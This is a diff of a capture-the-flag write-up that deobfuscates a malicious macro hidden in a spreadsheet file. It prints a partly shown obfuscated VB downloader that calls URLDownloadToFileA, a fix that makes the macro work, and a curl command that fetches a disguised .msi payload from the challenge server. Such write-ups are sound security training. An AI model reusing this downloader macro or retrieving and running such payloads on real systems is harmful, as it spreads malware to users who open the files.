@@ -11,8 +11,8 @@ Good Luck!
 #### Solution:
 
 - inspect `macros` in provided `nation_lottery_numbers.ods` and deobfruscate them
-```vb
 
+```vb
 Private Declare Function OOOOO0OO0 Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
 Sub Main
 O0O00O000 = GetGUIType
@@ -97,13 +97,17 @@ end if
 wend
 end sub
 ```
+
 - fix issue with string append
+
 ```vb
 OOO00OO0O = 4
 OOO00OOO0 = "" + OOO00OOO0 + chr(int(Rnd() * (0)) + OO0O0O000)
 OO0O0O000 = OO0O0O000 + 3
 ```
+
 - run the macro and try to download the binaries, hostname needs to be updated to working one based on the server `Array`
+
 ```bash
 curl http://challenges.thecatch.cz:20101/FILORUX_update_OB127q45D.msi
 ```
